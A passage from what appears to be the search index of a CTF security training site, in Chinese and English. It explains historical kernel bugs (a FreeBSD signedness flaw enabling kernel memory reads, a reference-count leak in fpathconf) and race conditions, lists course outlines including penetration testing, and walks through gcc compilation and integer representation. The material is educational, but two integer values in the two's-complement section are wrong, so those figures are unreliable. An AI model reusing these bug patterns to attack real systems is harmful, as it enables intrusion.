caddr_t data, int flag, fw_proc *td) { [...] int s, i, len, err = 0; [1] [...] struct fw_crom_buf *crom_buf = (struct fw_crom_buf *)data; [2] [...] if (fwdev == NULL) { [...] len = CROMSIZE; [...] } else { [...] if (fwdev->rommax < CSRROMOFF) len = 0; else len = fwdev->rommax - CSRROMOFF + 4; } if (crom_buf->len < len) [3] len = crom_buf->len; else crom_buf->len = len; err = copyout(ptr, crom_buf->ptr, len); [4] } [1] \u5904\u7684 len \u662f\u6709\u7b26\u53f7\u6574\u6570\uff0c crom_buf->len \u4e5f\u662f\u6709\u7b26\u53f7\u6570\u5e76\u4e14\u8be5\u503c\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\uff0c\u5982\u679c\u5b83\u88ab\u8bbe\u4e3a\u4e00\u4e2a\u8d1f\u6570\uff0c\u90a3\u4e48\u65e0\u8bba len \u7684\u503c\u662f\u4ec0\u4e48\uff0c[3] \u5904\u7684\u6761\u4ef6\u90fd\u4f1a\u6ee1\u8db3\u3002\u7136\u540e\u5728 [4] \u5904\uff0c copyout() \u88ab\u8c03\u7528\uff0c\u8be5\u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a int copyout(const void *__restrict kaddr, void *__restrict udaddr, size_t len) __nonnull(1) __nonnull(2); \u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u7c7b\u578b size_t \u662f\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u6240\u4ee5\u5f53 len \u662f\u4e00\u4e2a\u8d1f\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6b63\u6574\u6570\uff0c\u9020\u6210\u4efb\u610f\u5185\u6838\u5185\u5b58\u8bfb\u53d6\u3002 \u66f4\u591a\u5185\u5b58\u53ef\u4ee5\u53c2\u89c1\u7ae0\u8282 3.1.2\u3002","title":"\u6574\u6570\u8bef\u7528"},{"location":"Tutorial/Material/Binary%20Exploitation/#_30","text":"\u5982\u679c\u6709\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u6267\u884c\u8005\u5c06\u8981\u6267\u884c\u67d0\u4e00\u52a8\u4f5c\u5e76\u4e14\u6267\u884c\u7ed3\u679c\u4f1a\u7531\u4e8e\u5b83\u4eec\u6267\u884c\u987a\u5e8f\u7684\u4e0d\u540c\u800c\u5b8c\u5168\u4e0d\u540c\u65f6\uff0c\u4e5f\u5c31\u662f\u53d1\u751f\u4e86\u7ade\u4e89\u6761\u4ef6\u3002\u907f\u514d\u7ade\u4e89\u6761\u4ef6\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f8b\u5982\u901a\u8fc7\u9501\u3001\u4fe1\u53f7\u91cf\u3001\u6761\u4ef6\u53d8\u91cf\u7b49\u6765\u4fdd\u8bc1\u5404\u79cd\u884c\u52a8\u8005\u4e4b\u95f4\u7684\u540c\u6b65\u6027\u3002\u7ade\u4e89\u6761\u4ef6\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f\u53ef\u7ade\u4e89\u7a97\u53e3\u7684\u5927\u5c0f\uff0c\u5b83\u5bf9\u4e8e\u89e6\u53d1\u7ade\u6001\u6761\u4ef6\u7684\u96be\u6613\u81f3\u5173\u91cd\u8981\uff0c\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u4e00\u4e9b\u7ade\u6001\u6761\u4ef6\u7684\u60c5\u51b5\u53ea\u80fd\u5728\u5bf9\u79f0\u591a\u5904\u7406\u5668\uff08SMP\uff09\u4e2d\u88ab\u5229\u7528\u3002","title":"\u7ade\u6001\u6761\u4ef6"},{"location":"Tutorial/Material/Binary%20Exploitation/#bug","text":"\u903b\u8f91 bug \u6709\u5f88\u591a\u79cd\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\u5668\u6ea2\u51fa\u3002\u6211\u4eec\u77e5\u9053\u5171\u4eab\u8d44\u6e90\u90fd\u6709\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\uff0c\u5e76\u5728\u8ba1\u6570\u4e3a\u96f6\u65f6\u91ca\u653e\u6389\u8d44\u6e90\uff0c\u4fdd\u6301\u8db3\u591f\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u64cd\u4f5c\u7cfb\u7edf\u5f80\u5f80\u63d0\u4f9b get \u548c put/drop \u8fd9\u6837\u7684\u51fd\u6570\u6765\u663e\u5f0f\u5730\u589e\u52a0\u548c\u51cf\u5c11\u5f15\u7528\u8ba1\u6570\u3002 \u770b\u4e00\u4e2a FreeBSD V5.0 \u7684\u4f8b\u5b50\uff1a int fpathconf(td, uap) struct thread *td; register struct fpathconf_args *uap; { struct file *fp; struct vnode *vp; int error; if ((error = fget(td, uap->fd, &fp)) != 0) [1] return (error); [...] switch (fp->f_type) { case DTYPE_PIPE: case DTYPE_SOCKET: if (uap->name != _PC_PIPE_BUF) return (EINVAL); [2] p->p_retval[0] = PIPE_BUF; error = 0; break; [...] out: fdrop(fp, td); [3] return (error); } fpathconf() \u7cfb\u7edf\u8c03\u7528\u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u7279\u5b9a\u7684\u5f00\u653e\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4fe1\u606f\u3002\u6240\u4ee5\u8be5\u8c03\u7528\u5f00\u5934 [1] \u5904\u901a\u8fc7 fget() \u83b7\u53d6\u8be5\u6587\u4ef6\u63cf\u8ff0\u7b26\u7ed3\u6784\u7684\u5f15\u7528\uff0c\u7136\u540e\u5728\u9000\u51fa\u7684\u65f6\u5019 [3] \u5904\u901a\u8fc7 fdrop() \u91ca\u653e\u8be5\u5f15\u7528\u3002\u7136\u800c\u5728 [2] \u5904\u7684\u4ee3\u7801\u6ca1\u6709\u91ca\u653e\u76f8\u5173\u7684\u5f15\u7528\u8ba1\u6570\u5c31\u76f4\u63a5\u8fd4\u56de\u4e86\u3002\u5982\u679c\u591a\u6b21\u8c03\u7528 fpathconf() \u5e76\u89e6\u53d1 [2] \u5904\u7684\u8fd4\u56de\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u5f15\u7528\u8ba1\u6570\u5668\u7684\u6ea2\u51fa\u3002","title":"\u903b\u8f91 bug"},{"location":"Tutorial/Material/Cryptography/","text":"Modern Cryptography and Mathematics Introduction Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Several cryptography methods are illustrated in this course, while you would learn how to perform cryptography attacks. Remember the key point: do not create a cryptography model without mathematics proof. Material Cryptography Theory and Practice Introduction to Modern Cryptography: Principles and Protocols \u65b0\u7248\u6697\u53f7\u6280\u8853\u5165\u9580: \u79d8\u5bc6\u306e\u56fd\u306e\u30a2\u30ea\u30b9 Component Modern Cryptography and Perfectly Secret Encryption Private-Key Encryption Message Authentication Codes & Hash Functions Public-Key Cryptography Attack RSA and ECC Download Cryptography.pptx","title":"Modern Cryptography and Mathematics"},{"location":"Tutorial/Material/Cryptography/#modern-cryptography-and-mathematics","text":"","title":"Modern Cryptography and Mathematics"},{"location":"Tutorial/Material/Cryptography/#introduction","text":"Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Several cryptography methods are illustrated in this course, while you would learn how to perform cryptography attacks. Remember the key point: do not create a cryptography model without mathematics proof.","title":"Introduction"},{"location":"Tutorial/Material/Cryptography/#material","text":"Cryptography Theory and Practice Introduction to Modern Cryptography: Principles and Protocols \u65b0\u7248\u6697\u53f7\u6280\u8853\u5165\u9580: \u79d8\u5bc6\u306e\u56fd\u306e\u30a2\u30ea\u30b9","title":"Material"},{"location":"Tutorial/Material/Cryptography/#component","text":"Modern Cryptography and Perfectly Secret Encryption Private-Key Encryption Message Authentication Codes & Hash Functions Public-Key Cryptography Attack RSA and ECC","title":"Component"},{"location":"Tutorial/Material/Cryptography/#download","text":"Cryptography.pptx","title":"Download"},{"location":"Tutorial/Material/Network/","text":"Computer Network Introduction About computer network, how Internet works and basic protocols about computer network. Computer network is the basic course for Web challenges. Learning about Computer Network and learn about networking protocols , vulnerabilities , and key ideas of network traffic . Material Computer Networking: A Top-Down Approach (Optional) TCP / IP Illustrated Volume 1, 2, 3 Component Computer Network and the Internet Application Layer: HTTP & DNS Transmission Layer: TCP & UDP Network Layer: IP Link Layer and LAN Download Computer Network.pptx","title":"Computer Network"},{"location":"Tutorial/Material/Network/#computer-network","text":"","title":"Computer Network"},{"location":"Tutorial/Material/Network/#introduction","text":"About computer network, how Internet works and basic protocols about computer network. Computer network is the basic course for Web challenges. Learning about Computer Network and learn about networking protocols , vulnerabilities , and key ideas of network traffic .","title":"Introduction"},{"location":"Tutorial/Material/Network/#material","text":"Computer Networking: A Top-Down Approach (Optional) TCP / IP Illustrated Volume 1, 2, 3","title":"Material"},{"location":"Tutorial/Material/Network/#component","text":"Computer Network and the Internet Application Layer: HTTP & DNS Transmission Layer: TCP & UDP Network Layer: IP Link Layer and LAN","title":"Component"},{"location":"Tutorial/Material/Network/#download","text":"Computer Network.pptx","title":"Download"},{"location":"Tutorial/Material/OS/","text":"Operating Systems Introduction Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Material Computer Systems: A Programmer's Perspective Component Overview of Operating Systems Storage of Information and Program CPU Structure and Compiling of Program Storage Hierarchy Running of Program Exception and Interrupt Handling IO and Networking Download Operating Systems.pptx","title":"Operating Systems"},{"location":"Tutorial/Material/OS/#operating-systems","text":"","title":"Operating Systems"},{"location":"Tutorial/Material/OS/#introduction","text":"Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure.","title":"Introduction"},{"location":"Tutorial/Material/OS/#material","text":"Computer Systems: A Programmer's Perspective","title":"Material"},{"location":"Tutorial/Material/OS/#component","text":"Overview of Operating Systems Storage of Information and Program CPU Structure and Compiling of Program Storage Hierarchy Running of Program Exception and Interrupt Handling IO and Networking","title":"Component"},{"location":"Tutorial/Material/OS/#download","text":"Operating Systems.pptx","title":"Download"},{"location":"Tutorial/Material/Penetration/","text":"Penetration Testing Introduction From CTF challenges to the penetration testing and hacking a real system. Learn about how to carry out a real attack to the computer systems. Aim in AWD (Attack & Defense) CTF and learn how to penetration testing. Material The Hacker Playbook Component Environment Settings Information Gathering Web Application Exploiting Network Attack Other Attacking Methods Download Penetration.pptx","title":"Penetration Testing"},{"location":"Tutorial/Material/Penetration/#penetration-testing","text":"","title":"Penetration Testing"},{"location":"Tutorial/Material/Penetration/#introduction","text":"From CTF challenges to the penetration testing and hacking a real system. Learn about how to carry out a real attack to the computer systems. Aim in AWD (Attack & Defense) CTF and learn how to penetration testing.","title":"Introduction"},{"location":"Tutorial/Material/Penetration/#material","text":"The Hacker Playbook","title":"Material"},{"location":"Tutorial/Material/Penetration/#component","text":"Environment Settings Information Gathering Web Application Exploiting Network Attack Other Attacking Methods","title":"Component"},{"location":"Tutorial/Material/Penetration/#download","text":"Penetration.pptx","title":"Download"},{"location":"Tutorial/Material/Reverse/","text":"\u9006\u5411\u5de5\u7a0b\u4e0e\u6c47\u7f16\u8bed\u8a00 C \u8bed\u8a00\u57fa\u7840 \u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6 C \u8bed\u8a00\u6807\u51c6\u5e93 \u6574\u6570\u8868\u793a \u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570 \u5173\u4e8e C++ \u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6 \u6211\u4eec\u4ee5\u7ecf\u5178\u8457\u4f5c\u300aThe C Programming Language\u300b\u4e2d\u7684\u7b2c\u4e00\u4e2a\u7a0b\u5e8f \u201cHello World\u201d \u4e3a\u4f8b\uff0c\u8bb2\u89e3 Linux \u4e0b GCC \u7684\u7f16\u8bd1\u8fc7\u7a0b\u3002 #include <stdio.h> main() { printf(\"hello, world\\n\"); } $gcc hello.c $./a.out hello world \u4ee5\u4e0a\u8fc7\u7a0b\u53ef\u5206\u4e3a4\u4e2a\u6b65\u9aa4\uff1a\u9884\u5904\u7406\uff08Preprocessing\uff09\u3001\u7f16\u8bd1\uff08Compilation\uff09\u3001\u6c47\u7f16\uff08Assembly\uff09\u548c\u94fe\u63a5\uff08Linking\uff09\u3002 \u9884\u7f16\u8bd1 gcc -E hello.c -o hello.i # 1 \"hello.c\" # 1 \"<built-in>\" # 1 \"<command-line>\" ...... extern int printf (const char *__restrict __format, ...); ...... main() { printf(\"hello, world\\n\"); } \u9884\u7f16\u8bd1\u8fc7\u7a0b\u4e3b\u8981\u5904\u7406\u6e90\u4ee3\u7801\u4e2d\u4ee5 \u201c#\u201d \u5f00\u59cb\u7684\u9884\u7f16\u8bd1\u6307\u4ee4\uff1a \u5c06\u6240\u6709\u7684 \u201c#define\u201d \u5220\u9664\uff0c\u5e76\u4e14\u5c55\u5f00\u6240\u6709\u7684\u5b8f\u5b9a\u4e49\u3002 \u5904\u7406\u6240\u6709\u6761\u4ef6\u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5982 \u201c#if\u201d\u3001\u201c#ifdef\u201d\u3001\u201c#elif\u201d\u3001\u201c#else\u201d\u3001\u201c#endif\u201d\u3002 \u5904\u7406 \u201c#include\u201d \u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u63d2\u5165\u5230\u8be5\u9884\u7f16\u8bd1\u6307\u4ee4\u7684\u4f4d\u7f6e\u3002\u6ce8\u610f\uff0c\u8be5\u8fc7\u7a0b\u9012\u5f52\u6267\u884c\u3002 \u5220\u9664\u6240\u6709\u6ce8\u91ca\u3002 \u6dfb\u52a0\u884c\u53f7\u548c\u6587\u4ef6\u540d\u6807\u53f7\u3002 \u4fdd\u7559\u6240\u6709\u7684 #pragma \u7f16\u8bd1\u5668\u6307\u4ee4\u3002 \u7f16\u8bd1 gcc -S hello.c -o hello.s .file \"hello.c\" .section .rodata .LC0: .string \"hello, world\" .text .globl main .type main, @function main: .LFB0: .cfi_startproc pushq %rbp .cfi_def_cfa_offset 16 .cfi_offset 6, -16 movq %rsp, %rbp .cfi_def_cfa_register 6 leaq .LC0(%rip), %rdi call puts@PLT movl $0, %eax popq %rbp .cfi_def_cfa 7, 8 ret .cfi_endproc .LFE0: .size main, .-main .ident \"GCC: (GNU) 7.2.0\" .section .note.GNU-stack,\"\",@progbits \u7f16\u8bd1\u8fc7\u7a0b\u5c31\u662f\u628a\u9884\u5904\u7406\u5b8c\u7684\u6587\u4ef6\u8fdb\u884c\u4e00\u7cfb\u5217\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u53ca\u4f18\u5316\u540e\u751f\u6210\u76f8\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u6587\u4ef6\u3002 \u6c47\u7f16 $ gcc -c hello.s -o hello.o \u6216\u8005 $gcc -c hello.c -o hello.o $ objdump -sd hello.o hello.o: file format elf64-x86-64 Contents of section .text: 0000 554889e5 488d3d00 000000e8 00000000 UH..H.=......... 0010 b8000000 005dc3 .....]. Contents of section .rodata: 0000 68656c6c 6f2c2077 6f726c64 00 hello, world. Contents of section .comment: 0000 00474343 3a202847 4e552920 372e322e .GCC: (GNU) 7.2. 0010 3000 0. Contents of section .eh_frame: 0000 14000000 00000000 017a5200 01781001 .........zR..x.. 0010 1b0c0708 90010000 1c000000 1c000000 ................ 0020 00000000 17000000 00410e10 8602430d .........A....C. 0030 06520c07 08000000 .R...... Disassembly of section .text: 0000000000000000 <main>: 0: 55 push %rbp 1: 48 89 e5 mov %rsp,%rbp 4: 48 8d 3d 00 00 00 00 lea 0x0(%rip),%rdi # b <main+0xb> b: e8 00 00 00 00 callq 10 <main+0x10> 10: b8 00 00 00 00 mov $0x0,%eax 15: 5d pop %rbp 16: c3 retq \u6c47\u7f16\u5668\u5c06\u6c47\u7f16\u4ee3\u7801\u8f6c\u53d8\u6210\u673a\u5668\u53ef\u4ee5\u6267\u884c\u7684\u6307\u4ee4\u3002 \u94fe\u63a5 gcc hello.o -o hello $ objdump -d -j .text hello ...... 000000000000064a <main>: 64a: 55 push %rbp 64b: 48 89 e5 mov %rsp,%rbp 64e: 48 8d 3d 9f 00 00 00 lea 0x9f(%rip),%rdi # 6f4 <_IO_stdin_used+0x4> 655: e8 d6 fe ff ff callq 530 <puts@plt> 65a: b8 00 00 00 00 mov $0x0,%eax 65f: 5d pop %rbp 660: c3 retq 661: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 668: 00 00 00 66b: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) ...... \u76ee\u6807\u6587\u4ef6\u9700\u8981\u94fe\u63a5\u4e00\u5927\u5806\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u6700\u7ec8\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e0a\u9762\u53ea\u5c55\u793a\u4e86\u94fe\u63a5\u540e\u7684 main \u51fd\u6570\uff0c\u53ef\u4ee5\u548c hello.o \u4e2d\u7684 main \u51fd\u6570\u4f5c\u5bf9\u6bd4\uff09\u3002\u94fe\u63a5\u8fc7\u7a0b\u4e3b\u8981\u5305\u62ec\u5730\u5740\u548c\u7a7a\u95f4\u5206\u914d\uff08Address and Storage Allocation\uff09\u3001\u7b26\u53f7\u51b3\u8bae\uff08Symbol Resolution\uff09\u548c\u91cd\u5b9a\u5411\uff08Relocation\uff09\u7b49\u3002 gcc \u6280\u5de7 \u901a\u5e38\u5728\u7f16\u8bd1\u540e\u53ea\u4f1a\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u800c\u4e2d\u95f4\u8fc7\u7a0b\u751f\u6210\u7684 .i \u3001 .s \u3001 .o \u6587\u4ef6\u90fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53c2\u6570 -save-temps \u6c38\u4e45\u4fdd\u5b58\u8fd9\u4e9b\u4e34\u65f6\u7684\u4e2d\u95f4\u6587\u4ef6\u3002 $ gcc -save-temps hello.c $ ls a.out hello.c hello.i hello.o hello.s \u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\uff0cgcc \u9ed8\u8ba4\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u6240\u4ee5\u8fd9\u91cc\u751f\u6210\u7684 a.out \u5b9e\u9645\u4e0a\u662f\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002 $ file a.out a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=533aa4ca46d513b1276d14657ec41298cafd98b1, not stripped \u4f7f\u7528\u53c2\u6570 --verbose \u53ef\u4ee5\u8f93\u51fa gcc \u8be6\u7ec6\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002 gcc hello.c -static --verbose \u4e1c\u897f\u5f88\u591a\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e0b\u9762\u51e0\u6761\u4fe1\u606f\uff1a $ /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/cc1 -quiet -v hello.c -quiet -dumpbase hello.c -mtune=generic -march=x86-64 -auxbase hello -version -o /tmp/ccj1jUMo.s as -v --64 -o /tmp/ccAmXrfa.o /tmp/ccj1jUMo.s /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/collect2 -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/lto-wrapper -plugin-opt=-fresolution=/tmp/cc1l5oJV.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lc --build-id --hash-style=gnu -m elf_x86_64 -static /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/crtbeginT.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0 -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../.. /tmp/ccAmXrfa.o --start-group -lgcc -lgcc_eh -lc --end-group /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/crtend.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crtn.o \u4e09\u6761\u6307\u4ee4\u5206\u522b\u662f cc1 \u3001 as \u548c collect2 \uff0ccc1 \u662f gcc \u7684\u7f16\u8bd1\u5668\uff0c\u5c06 .c \u6587\u4ef6\u7f16\u8bd1\u4e3a .s \u6587\u4ef6\uff0cas \u662f\u6c47\u7f16\u5668\u547d\u4ee4\uff0c\u5c06 .s \u6587\u4ef6\u6c47\u7f16\u6210 .o \u6587\u4ef6\uff0ccollect2 \u662f\u94fe\u63a5\u5668\u547d\u4ee4\uff0c\u5b83\u662f\u5bf9\u547d\u4ee4 ld \u7684\u5c01\u88c5\u3002\u9759\u6001\u94fe\u63a5\u65f6\uff0cgcc \u5c06 C \u8bed\u8a00\u8fd0\u884c\u65f6\u5e93\u7684 5 \u4e2a\u91cd\u8981\u76ee\u6807\u6587\u4ef6 crt1.o \u3001 crti.o \u3001 crtbeginT.o \u3001 crtend.o \u3001 crtn.o \u548c -lgcc \u3001 -lgcc_eh \u3001 -lc \u8868\u793a\u7684 3 \u4e2a\u9759\u6001\u5e93\u94fe\u63a5\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002 \u66f4\u591a\u7684\u5185\u5bb9\u6211\u4eec\u4f1a\u5728 1.5.3 \u4e2d\u4e13\u95e8\u5bf9 ELF \u6587\u4ef6\u8fdb\u884c\u8bb2\u89e3\u3002 C \u8bed\u8a00\u6807\u51c6\u5e93 C \u8fd0\u884c\u5e93\uff08CRT\uff09\u662f\u4e00\u5957\u5e9e\u5927\u7684\u4ee3\u7801\u5e93\uff0c\u4ee5\u652f\u6491\u7a0b\u5e8f\u80fd\u591f\u6b63\u5e38\u5730\u8fd0\u884c\u3002\u5176\u4e2d C \u8bed\u8a00\u6807\u51c6\u5e93\u5360\u636e\u4e86\u6700\u4e3b\u8981\u5730\u4f4d\u3002 \u5e38\u7528\u7684\u6807\u51c6\u5e93\u6587\u4ef6\u5934\uff1a \u6807\u51c6\u8f93\u5165\u8f93\u51fa\uff08stdio.h\uff09 \u5b57\u7b26\u64cd\u4f5c\uff08ctype.h\uff09 \u5b57\u7b26\u4e32\u64cd\u4f5c\uff08string.h\uff09 \u6570\u5b66\u51fd\u6570\uff08math.h\uff09 \u5b9e\u7528\u7a0b\u5e8f\u5e93\uff08stdlib.h\uff09 \u65f6\u95f4\uff0f\u65e5\u671f\uff08time.h\uff09 \u65ad\u8a00\uff08assert.h\uff09 \u5404\u79cd\u7c7b\u578b\u4e0a\u7684\u5e38\u6570\uff08limits.h & float.h\uff09 \u53d8\u957f\u53c2\u6570\uff08stdarg.h\uff09 \u975e\u5c40\u90e8\u8df3\u8f6c\uff08setjmp.h\uff09 glibc \u5373 GNU C Library\uff0c\u662f\u4e3a GNU \u64cd\u4f5c\u7cfb\u7edf\u5f00\u53d1\u7684\u4e00\u4e2a C \u6807\u51c6\u5e93\u3002glibc \u4e3b\u8981\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u4e00\u90e8\u5206\u662f\u5934\u6587\u4ef6\uff0c\u4f4d\u4e8e /usr/include \uff1b\u53e6\u4e00\u90e8\u5206\u662f\u5e93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4e8c\u8fdb\u5236\u6587\u4ef6\u90e8\u5206\u4e3b\u8981\u662f C \u8bed\u8a00\u6807\u51c6\u5e93\uff0c\u6709\u52a8\u6001\u548c\u9759\u6001\u4e24\u4e2a\u7248\u672c\uff0c\u52a8\u6001\u7248\u672c\u4f4d\u4e8e /lib/libc.so.6 \uff0c\u9759\u6001\u7248\u672c\u4f4d\u4e8e /usr/lib/libc.a \u3002 \u5728\u6f0f\u6d1e\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u901a\u5e38\u6211\u4eec\u901a\u8fc7\u8ba1\u7b97\u76ee\u6807\u51fd\u6570\u5730\u5740\u76f8\u5bf9\u4e8e\u5df2\u77e5\u51fd\u6570\u5730\u5740\u5728\u540c\u4e00\u4e2a libc \u4e2d\u7684\u504f\u79fb\uff0c\u6765\u83b7\u5f97\u76ee\u6807\u51fd\u6570\u7684\u865a\u62df\u5730\u5740\uff0c\u8fd9\u65f6\u6211\u4eec\u9700\u8981\u8ba9\u672c\u5730\u7684 libc \u7248\u672c\u548c\u8fdc\u7a0b\u7684 libc \u7248\u672c\u76f8\u540c\uff0c\u53ef\u4ee5\u5148\u6cc4\u9732\u51e0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u7136\u540e\u5728 libcdb.com \u4e2d\u8fdb\u884c\u641c\u7d22\u6765\u5f97\u5230\u3002 \u6574\u6570\u8868\u793a \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cC \u8bed\u8a00\u4e2d\u7684\u6570\u5b57\u662f\u6709\u7b26\u53f7\u6570\uff0c\u4e0b\u9762\u6211\u4eec\u58f0\u660e\u4e00\u4e2a\u6709\u7b26\u53f7\u6574\u6570\u548c\u65e0\u7b26\u53f7\u6574\u6570\uff1a int var1 = 0; unsigned int var2 = 0; \u6709\u7b26\u53f7\u6574\u6570 \u53ef\u4ee5\u8868\u793a\u4e3a\u6b63\u6570\u6216\u8d1f\u6570 int \u7684\u8303\u56f4\uff1a -2,147,483,648 ~ 2,147,483,647 \u65e0\u7b26\u53f7\u6574\u6570 \u53ea\u80fd\u8868\u793a\u4e3a\u96f6\u6216\u6b63\u6570 unsigned int \u7684\u8303\u56f4\uff1a 0 ~ 4,294,967,295 signed \u6216\u8005 unsigned \u53d6\u51b3\u4e8e\u6574\u6570\u7c7b\u578b\u662f\u5426\u53ef\u4ee5\u643a\u5e26\u6807\u5fd7 +/- \uff1a Signed int signed int long Unsigned unit unsigned int unsigned long \u5728 signed int \u4e2d\uff0c\u4e8c\u8fdb\u5236\u6700\u9ad8\u4f4d\u88ab\u79f0\u4f5c\u7b26\u53f7\u4f4d\uff0c\u7b26\u53f7\u4f4d\u88ab\u8bbe\u7f6e\u4e3a 1 \u65f6\uff0c\u8868\u793a\u503c\u4e3a\u8d1f\uff0c\u5f53\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u503c\u4e3a\u975e\u8d1f\uff1a 0x7FFFFFFF = 2147493647 01111111111111111111111111111111 0x80000000 = -2147483647 10000000000000000000000000000000 0xFFFFFFFF = -1 11111111111111111111111111111111 \u4e8c\u8fdb\u5236\u8865\u7801\u4ee5\u4e00\u79cd\u9002\u5408\u4e8e\u4e8c\u8fdb\u5236\u52a0\u6cd5\u5668\u7684\u65b9\u5f0f\u6765\u8868\u793a\u8d1f\u6570\uff0c\u5f53\u4e00\u4e2a\u4e8c\u8fdb\u5236\u8865\u7801\u5f62\u5f0f\u8868\u793a\u7684\u8d1f\u6570\u548c\u4e0e\u5b83\u7684\u7edd\u5bf9\u503c\u76f8\u7b49\u7684\u6b63\u6570\u76f8\u52a0\u65f6\uff0c\u7ed3\u679c\u4e3a 0\u3002\u9996\u5148\u4ee5\u4e8c\u8fdb\u5236\u65b9\u5f0f\u5199\u51fa\u6b63\u6570\uff0c\u7136\u540e\u5bf9\u6240\u6709\u4f4d\u53d6\u53cd\uff0c\u6700\u540e\u52a0 1 \u5c31\u53ef\u4ee5\u5f97\u5230\u8be5\u6570\u7684\u4e8c\u8fdb\u5236\u8865\u7801\uff1a eg: 0x00123456 = 1193046 = 00000000000100100011010001010110 ~= 11111111111011011100101110101001 += 11111111111011011100101110101010 = -1193046 (0xFFEDCBAA) \u7f16\u8bd1\u5668\u9700\u8981\u6839\u636e\u53d8\u91cf\u7c7b\u578b\u4fe1\u606f\u7f16\u8bd1\u6210\u76f8\u5e94\u7684\u6307\u4ee4\uff1a \u6709\u7b26\u53f7\u6307\u4ee4 IDIV\uff1a\u5e26\u7b26\u53f7\u9664\u6cd5\u6307\u4ee4 IMUL\uff1a\u5e26\u7b26\u53f7\u4e58\u6cd5\u6307\u4ee4 SAL\uff1a\u7b97\u672f\u5de6\u79fb\u6307\u4ee4\uff08\u4fdd\u7559\u7b26\u53f7\uff09 SAR\uff1a\u53f3\u79fb\u53f3\u79fb\u6307\u4ee4\uff08\u4fdd\u7559\u7b26\u53f7\uff09 MOVSX\uff1a\u5e26\u7b26\u53f7\u6269\u5c55\u4f20\u9001\u6307\u4ee4 JL\uff1a\u5f53\u5c0f\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JLE\uff1a\u5f53\u5c0f\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JG\uff1a\u5f53\u5927\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JGE\uff1a\u5f53\u5927\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 \u65e0\u7b26\u53f7\u6307\u4ee4 DIV\uff1a\u9664\u6cd5\u6307\u4ee4 MUL\uff1a\u4e58\u6cd5\u6307\u4ee4 